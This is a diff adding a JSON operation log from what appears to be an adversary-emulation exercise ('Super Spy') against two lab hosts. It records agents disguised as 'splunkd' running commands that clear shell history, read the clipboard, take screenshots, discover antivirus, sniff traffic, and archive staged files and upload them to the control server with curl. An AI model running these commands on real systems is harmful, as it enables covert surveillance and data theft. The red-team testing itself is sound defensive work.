@@ -1,0 +1,1296 @@
+{
+  "name": "Testing Adversaries",
+  "host_group": [
+    {
+      "sleep_min": 30,
+      "username": "kali",
+      "executors": [
+        "proc",
+        "sh"
+      ],
+      "paw": "uzblob",
+      "created": "2023-09-22T07:30:09Z",
+      "location": "/home/kali/splunkd",
+      "architecture": "amd64",
+      "deadman_enabled": true,
+      "sleep_max": 60,
+      "proxy_chain": [],
+      "links": [
+        {
+          "pin": 0,
+          "paw": "uzblob",
+          "agent_reported_time": "2023-09-22T07:30:09Z",
+          "ability": {
+            "technique_id": "T1070.003",
+            "buckets": [
+              "defense-evasion"
+            ],
+            "repeatable": false,
+            "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a",
+            "executors": [
+              {
+                "parsers": [],
+                "build_target": null,
+                "timeout": 60,
+                "language": null,
+                "additional_info": {},
+                "uploads": [],
+                "name": "sh",
+                "platform": "darwin",
+                "code": null,
+                "cleanup": [],
+                "command": "> $HOME/.bash_history && unset HISTFILE",
+                "payloads": [],
+                "variations": []
+              },
+              {
+                "parsers": [],
+                "build_target": null,
+                "timeout": 60,
+                "language": null,
+                "additional_info": {},
+                "uploads": [],
+                "name": "sh",
+                "platform": "linux",
+                "code": null,
+                "cleanup": [],
+                "command": "> $HOME/.bash_history && unset HISTFILE",
+                "payloads": [],
+                "variations": []
+              },
+              {
+                "parsers": [],
+                "build_target": null,
+                "timeout": 60,
+                "language": null,
+                "additional_info": {},
+                "uploads": [],
+                "name": "psh",
+                "platform": "windows",
+                "code": null,
+                "cleanup": [],
+                "command": "Clear-History;Clear",
+                "payloads": [],
+                "variations": []
+              }
+            ],
+            "additional_info": {},
+            "access": {},
+            "plugin": "stockpile",
+            "delete_payload": true,
+            "privilege": null,
+            "description": "Stop terminal from logging history",
+            "singleton": false,
+            "technique_name": "Indicator Removal on Host: Clear Command History",
+            "requirements": [],
+            "tactic": "defense-evasion",
+            "name": "Avoid logs"
+          },
+          "jitter": 0,
+          "facts": [],
+          "output": "False",
+          "unique": "e41b8dde-01c1-4016-867e-03e2b3c9dbe8",
+          "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF",
+          "pid": "5821",
+          "executor": {
+            "parsers": [],
+            "build_target": null,
+            "timeout": 60,
+            "language": null,
+            "additional_info": {},
+            "uploads": [],
+            "name": "sh",
+            "platform": "linux",
+            "code": null,
+            "cleanup": [],
+            "command": "> $HOME/.bash_history && unset HISTFILE",
+            "payloads": [],
+            "variations": []
+          },
+          "used": [],
+          "collect": "2023-09-22T07:30:09Z",
+          "id": "e41b8dde-01c1-4016-867e-03e2b3c9dbe8",
+          "score": 0,
+          "finish": "2023-09-22T07:30:09Z",
+          "host": "pheonix",
+          "deadman": false,
+          "visibility": {
+            "score": 50,
+            "adjustments": []
+          },
+          "decide": "2023-09-22T07:30:09Z",
+          "status": 0,
+          "relationships": [],
+          "cleanup": 0,
+          "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF"
+        }
+      ],
+      "group": "red",
+      "pid": 5815,
+      "display_name": "pheonix$kali",
+      "available_contacts": [
+        "HTTP"
+      ],
+      "server": "http://localhost:8888",
+      "upstream_dest": "http://localhost:8888",
+      "host": "pheonix",
+      "platform": "linux",
+      "origin_link_id": "",
+      "pending_contact": "HTTP",
+      "last_seen": "2023-09-22T08:04:09Z",
+      "trusted": true,
+      "ppid": 4476,
+      "privilege": "User",
+      "exe_name": "splunkd",
+      "watchdog": 0,
+      "host_ip_addrs": [
+        "192.168.152.128"
+      ],
+      "proxy_receivers": {},
+      "contact": "HTTP"
+    },
+    {
+      "sleep_min": 30,
+      "username": "DESKTOP-OBPRFU1\\lefoj",
+      "executors": [
+        "cmd",
+        "psh",
+        "proc"
+      ],
+      "paw": "wmukjr",
+      "created": "2023-09-22T07:38:52Z",
+      "location": "C:\\Users\\Public\\splunkd.exe",
+      "architecture": "amd64",
+      "deadman_enabled": true,
+      "sleep_max": 60,
+      "proxy_chain": [],
+      "links": [
+        {
+          "pin": 0,
+          "paw": "wmukjr",
+          "agent_reported_time": "2023-09-22T07:38:52Z",
+          "ability": {
+            "technique_id": "T1070.003",
+            "buckets": [
+              "defense-evasion"
+            ],
+            "repeatable": false,
+            "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a",
+            "executors": [
+              {
+                "parsers": [],
+                "build_target": null,
+                "timeout": 60,
+                "language": null,
+                "additional_info": {},
+                "uploads": [],
+                "name": "sh",
+                "platform": "darwin",
+                "code": null,
+                "cleanup": [],
+                "command": "> $HOME/.bash_history && unset HISTFILE",
+                "payloads": [],
+                "variations": []
+              },
+              {
+                "parsers": [],
+                "build_target": null,
+                "timeout": 60,
+                "language": null,
+                "additional_info": {},
+                "uploads": [],
+                "name": "sh",
+                "platform": "linux",
+                "code": null,
+                "cleanup": [],
+                "command": "> $HOME/.bash_history && unset HISTFILE",
+                "payloads": [],
+                "variations": []
+              },
+              {
+                "parsers": [],
+                "build_target": null,
+                "timeout": 60,
+                "language": null,
+                "additional_info": {},
+                "uploads": [],
+                "name": "psh",
+                "platform": "windows",
+                "code": null,
+                "cleanup": [],
+                "command": "Clear-History;Clear",
+                "payloads": [],
+                "variations": []
+              }
+            ],
+            "additional_info": {},
+            "access": {},
+            "plugin": "stockpile",
+            "delete_payload": true,
+            "privilege": null,
+            "description": "Stop terminal from logging history",
+            "singleton": false,
+            "technique_name": "Indicator Removal on Host: Clear Command History",
+            "requirements": [],
+            "tactic": "defense-evasion",
+            "name": "Avoid logs"
+          },
+          "jitter": 0,
+          "facts": [],
+          "output": "False",
+          "unique": "5a43d01a-174b-4f72-a059-3e7fbe3f8cad",
+          "plaintext_command": "Q2xlYXItSGlzdG9yeTtDbGVhcg==",
+          "pid": "7216",
+          "executor": {
+            "parsers": [],
+            "build_target": null,
+            "timeout": 60,
+            "language": null,
+            "additional_info": {},
+            "uploads": [],
+            "name": "psh",
+            "platform": "windows",
+            "code": null,
+            "cleanup": [],
+            "command": "Clear-History;Clear",
+            "payloads": [],
+            "variations": []
+          },
+          "used": [],
+          "collect": "2023-09-22T07:38:52Z",
+          "id": "5a43d01a-174b-4f72-a059-3e7fbe3f8cad",
+          "score": 0,
+          "finish": "2023-09-22T07:38:53Z",
+          "host": "DESKTOP-OBPRFU1",
+          "deadman": false,
+          "visibility": {
+            "score": 50,
+            "adjustments": []
+          },
+          "decide": "2023-09-22T07:38:52Z",
+          "status": 0,
+          "relationships": [],
+          "cleanup": 0,
+          "command": "Q2xlYXItSGlzdG9yeTtDbGVhcg=="
+        }
+      ],
+      "group": "red",
+      "pid": 6596,
+      "display_name": "DESKTOP-OBPRFU1$DESKTOP-OBPRFU1\\lefoj",
+      "available_contacts": [
+        "HTTP"
+      ],
+      "server": "http://192.168.152.128:8888",
+      "upstream_dest": "http://192.168.152.128:8888",
+      "host": "DESKTOP-OBPRFU1",
+      "platform": "windows",
+      "origin_link_id": "",
+      "pending_contact": "HTTP",
+      "last_seen": "2023-09-22T08:03:29Z",
+      "trusted": true,
+      "ppid": 9004,
+      "privilege": "Elevated",
+      "exe_name": "splunkd.exe",
+      "watchdog": 0,
+      "host_ip_addrs": [
+        "192.168.152.129"
+      ],
+      "proxy_receivers": {},
+      "contact": "HTTP"
+    }
+  ],
+  "start": "2023-09-22T07:50:33Z",
+  "steps": {
+    "uzblob": {
+      "steps": [
+        {
+          "link_id": "e51144f5-ea19-4bed-9556-5e58f6231688",
+          "ability_id": "b007fe0c-c6b0-4fda-915c-255bbc070de2",
+          "command": "xclip -o",
+          "plaintext_command": "xclip -o",
+          "delegated": "2023-09-22T07:50:33Z",
+          "run": "2023-09-22T07:50:44Z",
+          "status": 1,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 7623,
+          "description": "copy the contents for the clipboard and print them",
+          "name": "Copy Clipboard",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Clipboard Data",
+            "technique_id": "T1115"
+          },
+          "output": {
+            "stdout": "",
+            "stderr": "sh: 1: xclip: not found",
+            "exit_code": "127"
+          },
+          "agent_reported_time": "2023-09-22T07:50:44Z"
+        },
+        {
+          "link_id": "2f141405-04c8-4b83-94e2-4d3c24eb989d",
+          "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
+          "command": "mkdir -p staged && echo $PWD/staged",
+          "plaintext_command": "mkdir -p staged && echo $PWD/staged",
+          "delegated": "2023-09-22T07:51:18Z",
+          "run": "2023-09-22T07:51:46Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 7700,
+          "description": "create a directory for exfil staging",
+          "name": "Create staging directory",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Data Staged: Local Data Staging",
+            "technique_id": "T1074.001"
+          },
+          "output": {
+            "stdout": "/home/kali/staged",
+            "stderr": "",
+            "exit_code": "0"
+          },
+          "agent_reported_time": "2023-09-22T07:51:46Z"
+        },
+        {
+          "link_id": "aec0b770-ec9b-4f14-9230-36d872f539e6",
+          "ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74",
+          "command": "tar -P -zcf /home/kali/staged.tar.gz /home/kali/staged && echo /home/kali/staged.tar.gz",
+          "plaintext_command": "tar -P -zcf /home/kali/staged.tar.gz /home/kali/staged && echo /home/kali/staged.tar.gz",
+          "delegated": "2023-09-22T07:51:54Z",
+          "run": "2023-09-22T07:52:30Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 7753,
+          "description": "Compress a directory on the file system",
+          "name": "Compress staged directory",
+          "attack": {
+            "tactic": "exfiltration",
+            "technique_name": "Archive Collected Data: Archive via Utility",
+            "technique_id": "T1560.001"
+          },
+          "output": {
+            "stdout": "/home/kali/staged.tar.gz",
+            "stderr": "",
+            "exit_code": "0"
+          },
+          "agent_reported_time": "2023-09-22T07:52:30Z"
+        },
+        {
+          "link_id": "80f41a0c-7639-4ec5-bacd-189774235321",
+          "ability_id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e",
+          "command": "curl -F \"data=@/home/kali/staged.tar.gz\" --header \"X-Request-ID: `hostname`-uzblob\" http://localhost:8888/file/upload",
+          "plaintext_command": "curl -F \"data=@/home/kali/staged.tar.gz\" --header \"X-Request-ID: `hostname`-uzblob\" http://localhost:8888/file/upload",
+          "delegated": "2023-09-22T07:52:49Z",
+          "run": "2023-09-22T07:53:16Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 7769,
+          "description": "Exfil the staged directory",
+          "name": "Exfil staged directory",
+          "attack": {
+            "tactic": "exfiltration",
+            "technique_name": "Exfiltration Over C2 Channel",
+            "technique_id": "T1041"
+          },
+          "output": {
+            "stdout": "",
+            "stderr": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100   331    0     0  100   331      0   143k --:--:-- --:--:-- --:--:--  161k",
+            "exit_code": "0"
+          },
+          "agent_reported_time": "2023-09-22T07:53:16Z"
+        },
+        {
+          "link_id": "d1bc9b4f-3b4b-4949-8381-f8a3139152bd",
+          "ability_id": "9a30740d-3aa8-4c23-8efa-d51215e8a5b9",
+          "command": "./obfuscated_payload.sh scan",
+          "plaintext_command": "./obfuscated_payload.sh scan",
+          "delegated": "2023-09-22T07:53:44Z",
+          "run": "2023-09-22T07:53:55Z",
+          "status": 1,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 7781,
+          "description": "View all potential WIFI networks on host",
+          "name": "Scan WIFI networks",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Network Configuration Discovery",
+            "technique_id": "T1016"
+          },
+          "output": {
+            "stdout": "",
+            "stderr": "sh: 1: ./obfuscated_payload.sh: not found",
+            "exit_code": "127"
+          },
+          "agent_reported_time": "2023-09-22T07:53:55Z"
+        },
+        {
+          "link_id": "75c6e58d-c0d8-436b-beea-e73ad163bfdf",
+          "ability_id": "a0676fe1-cd52-482e-8dde-349b73f9aa69",
+          "command": "./wifi.sh pref",
+          "plaintext_command": "./wifi.sh pref",
+          "delegated": "2023-09-22T07:54:29Z",
+          "run": "2023-09-22T07:54:41Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 7800,
+          "description": "See the most used WIFI networks of a machine",
+          "name": "Preferred WIFI",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Network Configuration Discovery",
+            "technique_id": "T1016"
+          },
+          "output": {
+            "stdout": "AUTOCONNECT-PRIORITY  NAME               -999                  Wired connection 1 0                     lo                 0                     Lonelypheonix      ",
+            "stderr": "",
+            "exit_code": "0"
+          },
+          "agent_reported_time": "2023-09-22T07:54:41Z"
+        }
+      ]
+    },
+    "wmukjr": {
+      "steps": [
+        {
+          "link_id": "602689fd-74c7-4fd4-915a-77d12d1522a1",
+          "ability_id": "316251ed-6a28-4013-812b-ddf5b5b007f8",
+          "command": "$loadResult = [Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\");function screenshot([Drawing.Rectangle]$bounds, $path) {   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;   $graphics = [Drawing.Graphics]::FromImage($bmp);   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);   $bmp.Save($path);   $graphics.Dispose();   $bmp.Dispose();}if ($loadResult) {  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);  $dest = \"$HOME\\Desktop\\screenshot.png\";  screenshot $bounds $dest;  if (Test-Path -Path $dest) {    $dest;    exit 0;  };};exit 1;",
+          "plaintext_command": "$loadResult = [Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\");function screenshot([Drawing.Rectangle]$bounds, $path) {   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;   $graphics = [Drawing.Graphics]::FromImage($bmp);   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);   $bmp.Save($path);   $graphics.Dispose();   $bmp.Dispose();}if ($loadResult) {  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);  $dest = \"$HOME\\Desktop\\screenshot.png\";  screenshot $bounds $dest;  if (Test-Path -Path $dest) {    $dest;    exit 0;  };};exit 1;",
+          "delegated": "2023-09-22T07:50:33Z",
+          "run": "2023-09-22T07:51:17Z",
+          "status": 1,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 2252,
+          "description": "capture the contents of the screen",
+          "name": "Screen Capture",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Screen Capture",
+            "technique_id": "T1113"
+          },
+          "output": {
+            "stdout": "",
+            "stderr": "Exception calling \"Save\" with \"1\" argument(s): \"A generic error occurred in GDI+.\"At line:1 char:336+ ... on, [Drawing.Point]::Empty, $bounds.size);   $bmp.Save($path);   $gra ...+                                                  ~~~~~~~~~~~~~~~~    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException    + FullyQualifiedErrorId : ExternalException ",
+            "exit_code": "1"
+          },
+          "agent_reported_time": "2023-09-22T07:51:13Z"
+        },
+        {
+          "link_id": "36460600-aaad-4e51-94a1-6757d2064d2d",
+          "ability_id": "b007fe0c-c6b0-4fda-915c-255bbc070de2",
+          "command": "Get-Clipboard -raw",
+          "plaintext_command": "Get-Clipboard -raw",
+          "delegated": "2023-09-22T07:51:18Z",
+          "run": "2023-09-22T07:51:53Z",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 3876,
+          "description": "copy the contents for the clipboard and print them",
+          "name": "Copy Clipboard",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Clipboard Data",
+            "technique_id": "T1115"
+          },
+          "agent_reported_time": "2023-09-22T07:51:50Z"
+        },
+        {
+          "link_id": "f72c8416-cca6-4153-a8fb-3f37dbde6634",
+          "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
+          "command": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object",
+          "plaintext_command": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object",
+          "delegated": "2023-09-22T07:51:54Z",
+          "run": "2023-09-22T07:52:46Z",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 8584,
+          "description": "create a directory for exfil staging",
+          "name": "Create staging directory",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Data Staged: Local Data Staging",
+            "technique_id": "T1074.001"
+          },
+          "output": {
+            "stdout": "C:\\Windows\\system32\\staged",
+            "stderr": "",
+            "exit_code": "0"
+          },
+          "agent_reported_time": "2023-09-22T07:52:43Z"
+        },
+        {
+          "link_id": "1ffd49b6-6de4-439f-ae07-2c042b9d962f",
+          "ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74",
+          "command": "Compress-Archive -Path C:\\Windows\\system32\\staged -DestinationPath C:\\Windows\\system32\\staged.zip -Force;sleep 1; ls C:\\Windows\\system32\\staged.zip | foreach {$_.FullName} | select",
+          "plaintext_command": "Compress-Archive -Path C:\\Windows\\system32\\staged -DestinationPath C:\\Windows\\system32\\staged.zip -Force;sleep 1; ls C:\\Windows\\system32\\staged.zip | foreach {$_.FullName} | select",
+          "delegated": "2023-09-22T07:52:49Z",
+          "run": "2023-09-22T07:53:40Z",
+          "status": 1,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 7836,
+          "description": "Compress a directory on the file system",
+          "name": "Compress staged directory",
+          "attack": {
+            "tactic": "exfiltration",
+            "technique_name": "Archive Collected Data: Archive via Utility",
+            "technique_id": "T1560.001"
+          },
+          "output": {
+            "stdout": "",
+            "stderr": "ls : Cannot find path 'C:\\Windows\\system32\\staged.zip' because it does not exist.At line:1 char:115+ ... \\staged.zip -Force;sleep 1; ls C:\\Windows\\system32\\staged.zip | forea ...+                                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Windows\\system32\\staged.zip:String) [Get-ChildItem], ItemNotFoundExc    eption    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand ",
+            "exit_code": "1"
+          },
+          "agent_reported_time": "2023-09-22T07:53:35Z"
+        },
+        {
+          "link_id": "045a22f4-f331-44f4-8f4f-355a3a7f32a6",
+          "ability_id": "2dece965-37a0-4f70-a391-0f30e3331aba",
+          "command": "wmic /NAMESPACE:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value",
+          "plaintext_command": "wmic /NAMESPACE:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value",
+          "delegated": "2023-09-22T07:53:44Z",
+          "run": "2023-09-22T07:54:25Z",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 8928,
+          "description": "Identify AV",
+          "name": "Discover antivirus programs",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Software Discovery: Security Software Discovery",
+            "technique_id": "T1518.001"
+          },
+          "output": {
+            "stdout": "\r\rdisplayName=Windows Defender\rinstanceGuid={D68DDC3A-831F-4fae-9E44-DA132C1ACF46}\rpathToSignedProductExe=windowsdefender://\rpathToSignedReportingExe=%ProgramFiles%\\Windows Defender\\MsMpeng.exe\rproductState=401664\rtimestamp=Fri, 22 Sep 2023 07:38:37 GMT\r\r\r\r",
+            "stderr": "",
+            "exit_code": "0"
+          },
+          "agent_reported_time": "2023-09-22T07:54:23Z"
+        },
+        {
+          "link_id": "dfcb9c98-ac55-44e6-9aec-685d62fe43d3",
+          "ability_id": "9a30740d-3aa8-4c23-8efa-d51215e8a5b9",
+          "command": ".\\obfuscated_payload.ps1 -Scan",
+          "plaintext_command": ".\\obfuscated_payload.ps1 -Scan",
+          "delegated": "2023-09-22T07:54:29Z",
+          "run": "2023-09-22T07:55:14Z",
+          "status": 1,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 7416,
+          "description": "View all potential WIFI networks on host",
+          "name": "Scan WIFI networks",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Network Configuration Discovery",
+            "technique_id": "T1016"
+          },
+          "output": {
+            "stdout": "",
+            "stderr": ".\\obfuscated_payload.ps1 : The term '.\\obfuscated_payload.ps1' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:1+ .\\obfuscated_payload.ps1 -Scan+ ~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (.\\obfuscated_payload.ps1:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException ",
+            "exit_code": "1"
+          },
+          "agent_reported_time": "2023-09-22T07:55:12Z"
+        },
+        {
+          "link_id": "fc3c5300-bd8f-4d92-afcd-983fb3420742",
+          "ability_id": "a0676fe1-cd52-482e-8dde-349b73f9aa69",
+          "command": ".\\wifi.ps1 -Pref",
+          "plaintext_command": ".\\wifi.ps1 -Pref",
+          "delegated": "2023-09-22T07:55:14Z",
+          "run": "2023-09-22T07:56:08Z",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 1604,
+          "description": "See the most used WIFI networks of a machine",
+          "name": "Preferred WIFI",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Network Configuration Discovery",
+            "technique_id": "T1016"
+          },
+          "output": {
+            "stdout": "Getting preferred WIFI networksThe Wireless AutoConfig Service (wlansvc) is not running.",
+            "stderr": "",
+            "exit_code": "0"
+          },
+          "agent_reported_time": "2023-09-22T07:56:06Z"
+        },
+        {
+          "link_id": "6752815d-dd98-45f7-bbdc-18be10c2150c",
+          "ability_id": "1b4fb81c-8090-426c-93ab-0a633e7a16a7",
+          "command": "$path = \"$ENV:UserProfile\\Desktop\\pcap.etl\";New-NetEventSession -Name \"PCAP\" -CaptureMode SaveToFile -LocalFilePath $path;Add-NetEventProvider -Name \"Microsoft-Windows-TCPIP\" -SessionName \"PCAP\";Start-NetEventSession -Name \"PCAP\";Start-Sleep -s 60;Stop-NetEventSession -Name \"PCAP\";if (Test-Path $path) {  echo $path;  exit 0;} else {  echo \"Failed to generate PCAP file.\";  exit 1;};",
+          "plaintext_command": "$path = \"$ENV:UserProfile\\Desktop\\pcap.etl\";New-NetEventSession -Name \"PCAP\" -CaptureMode SaveToFile -LocalFilePath $path;Add-NetEventProvider -Name \"Microsoft-Windows-TCPIP\" -SessionName \"PCAP\";Start-NetEventSession -Name \"PCAP\";Start-Sleep -s 60;Stop-NetEventSession -Name \"PCAP\";if (Test-Path $path) {  echo $path;  exit 0;} else {  echo \"Failed to generate PCAP file.\";  exit 1;};",
+          "delegated": "2023-09-22T07:56:09Z",
+          "run": "2023-09-22T07:58:00Z",
+          "status": 1,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 2848,
+          "description": "Perform a packet capture",
+          "name": "Sniff network traffic",
+          "attack": {
+            "tactic": "credential-access",
+            "technique_name": "Network Sniffing",
+            "technique_id": "T1040"
+          },
+          "output": {
+            "stdout": "Failed to generate PCAP file.",
+            "stderr": "New-NetEventSession : One or more parameter values passed to the method were invalid.At line:1 char:45+ ... p\\pcap.etl\";New-NetEventSession -Name \"PCAP\" -CaptureMode SaveToFile  ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidArgument: (MSFT_NetEventSession:root/StandardCimv2/MSFT_NetEventSession) [New-Net    EventSession], CimException    + FullyQualifiedErrorId : MI RESULT 4,New-NetEventSession Add-NetEventProvider : The requested object could not be found.At line:1 char:123+ ... ePath $path;Add-NetEventProvider -Name \"Microsoft-Windows-TCPIP\" -Ses ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (MSFT_NetEventProvider:root/StandardCimv2/MSFT_NetEventProvider) [Add-Ne    tEventProvider], CimException    + FullyQualifiedErrorId : MI RESULT 6,Add-NetEventProvider Start-NetEventSession : No MSFT_NetEventSession objects found with property 'Name' equal to 'PCAP'.  Verify the value of the property and retry.At line:1 char:196+ ... TCPIP\" -SessionName \"PCAP\";Start-NetEventSession -Name \"PCAP\";Start-S ...+                                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (PCAP:String) [Start-NetEventSession], CimJobException    + FullyQualifiedErrorId : CmdletizationQuery_NotFound_Name,Start-NetEventSession Stop-NetEventSession : No MSFT_NetEventSession objects found with property 'Name' equal to 'PCAP'.  Verify the value of the property and retry.At line:1 char:249+ ... me \"PCAP\";Start-Sleep -s 60;Stop-NetEventSession -Name \"PCAP\";if (Tes ...+                                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (PCAP:String) [Stop-NetEventSession], CimJobException    + FullyQualifiedErrorId : CmdletizationQuery_NotFound_Name,Stop-NetEventSession ",
+            "exit_code": "1"
+          },
+          "agent_reported_time": "2023-09-22T07:56:52Z"
+        }
+      ]
+    }
+  },
+  "finish": null,
+  "planner": "atomic",
+  "adversary": {
+    "atomic_ordering": [
+      "316251ed-6a28-4013-812b-ddf5b5b007f8",
+      "b007fe0c-c6b0-4fda-915c-255bbc070de2",
+      "b007fc38-9eb7-4320-92b3-9a3ad3e6ec25",
+      "78524da1-f347-4fbb-9295-209f1f408330",
+      "6469befa-748a-4b9c-a96d-f191fde47d89",
+      "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
+      "4e97e699-93d7-4040-b5a3-2e906a58199e",
+      "300157e5-f4ad-4569-b533-9d1fa0e74d74",
+      "ea713bc4-63f0-491c-9a6f-0b01d560b87e",
+      "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
+      "2dece965-37a0-4f70-a391-0f30e3331aba",
+      "9a30740d-3aa8-4c23-8efa-d51215e8a5b9",
+      "a0676fe1-cd52-482e-8dde-349b73f9aa69",
+      "1b4fb81c-8090-426c-93ab-0a633e7a16a7",
+      "de52784d-4de6-4d4e-b79e-e7b68fe037fb"
+    ],
+    "plugin": "stockpile",
+    "description": "Monitor the active user and navigate through their digital belongings",
+    "adversary_id": "564ae20d-778d-4965-93dc-b523be2e2ab4",
+    "objective": "495a9828-cab1-44dd-a0ca-66e58177d8cc",
+    "tags": [],
+    "has_repeatable_abilities": false,
+    "name": "Super Spy"
+  },
+  "jitter": "2/8",
+  "objectives": {
+    "goals": [
+      {
+        "count": 1048576,
+        "achieved": false,
+        "target": "exhaustion",
+        "operator": "==",
+        "value": "complete"
+      }
+    ],
+    "id": "495a9828-cab1-44dd-a0ca-66e58177d8cc",
+    "percentage": 0,
+    "description": "This is a default objective that runs forever.",
+    "name": "default"
+  },
+  "facts": [
+    {
+      "technique_id": "",
+      "unique": "linux.included.extensionstxt,cfg,conf,yml,doc,docx,xls,xlsx,pdf,sh,jpg,p7b,p7s,p7r,p12,pfx",
+      "relationships": [],
+      "score": 1,
+      "limit_count": -1,
+      "trait": "linux.included.extensions",
+      "origin_type": "SEEDED",
+      "links": [],
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "collected_by": [],
+      "name": "linux.included.extensions",
+      "created": "2023-09-22T07:50:33Z",
+      "value": "txt,cfg,conf,yml,doc,docx,xls,xlsx,pdf,sh,jpg,p7b,p7s,p7r,p12,pfx"
+    },
+    {
+      "technique_id": "",
+      "unique": "windows.included.extensionsdoc,xps,xls,ppt,pps,wps,wpd,ods,odt,lwp,jtd,pdf,zip,rar,docx,url,xlsx,pptx,ppsx,pst,ost,jpg,txt,lnk,p7b,p7s,p7r,p12,pfx",
+      "relationships": [],
+      "score": 1,
+      "limit_count": -1,
+      "trait": "windows.included.extensions",
+      "origin_type": "SEEDED",
+      "links": [],
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "collected_by": [],
+      "name": "windows.included.extensions",
+      "created": "2023-09-22T07:50:33Z",
+      "value": "doc,xps,xls,ppt,pps,wps,wpd,ods,odt,lwp,jtd,pdf,zip,rar,docx,url,xlsx,pptx,ppsx,pst,ost,jpg,txt,lnk,p7b,p7s,p7r,p12,pfx"
+    },
+    {
+      "technique_id": "",
+      "unique": "windows.excluded.extensionsexe,jar,dll,msi,bak,vmx,vmdx,vmdk,lck",
+      "relationships": [],
+      "score": 1,
+      "limit_count": -1,
+      "trait": "windows.excluded.extensions",
+      "origin_type": "SEEDED",
+      "links": [],
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "collected_by": [],
+      "name": "windows.excluded.extensions",
+      "created": "2023-09-22T07:50:33Z",
+      "value": "exe,jar,dll,msi,bak,vmx,vmdx,vmdk,lck"
+    },
+    {
+      "technique_id": "",
+      "unique": "file.sensitive.contentuser,pass,username,password,uname,psw",
+      "relationships": [],
+      "score": 1,
+      "limit_count": -1,
+      "trait": "file.sensitive.content",
+      "origin_type": "SEEDED",
+      "links": [],
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "collected_by": [],
+      "name": "file.sensitive.content",
+      "created": "2023-09-22T07:50:33Z",
+      "value": "user,pass,username,password,uname,psw"
+    },
+    {
+      "technique_id": "",
+      "unique": "file.last.accessed-30",
+      "relationships": [],
+      "score": 1,
+      "limit_count": -1,
+      "trait": "file.last.accessed",
+      "origin_type": "SEEDED",
+      "links": [],
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "collected_by": [],
+      "name": "file.last.accessed",
+      "created": "2023-09-22T07:50:33Z",
+      "value": "-30"
+    },
+    {
+      "technique_id": "",
+      "unique": "file.last.modified-30",
